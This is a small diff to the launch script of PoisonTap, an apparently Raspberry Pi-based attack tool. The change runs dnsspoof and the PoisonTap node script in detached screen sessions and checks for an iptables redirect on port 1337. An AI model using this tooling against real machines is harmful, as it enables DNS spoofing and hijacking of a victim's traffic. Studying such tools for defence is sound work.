@@ -6,11 +6,11 @@ HOME='/home/pi/'
 sleep 5 # after captive portal checks
 
 [[ $(pgrep dnsspoof) = '' ]] && {
-  dnsspoof -i "$1" port 53
+  screen -dmS dnsspoof dnsspoof -i "$1" port 53
 }
 
 [[ $(pgrep -f pi_poisontap.js) = '' ]] && {
-  nodejs $HOME/src/poisontap/pi_poisontap.js
+  screen -dmS poisontap nodejs $HOME/src/poisontap/pi_poisontap.js
 }
 
 [[ $(iptables -t nat -vnL PREROUTING | grep "$1" | grep 1337) = '' ]] && {
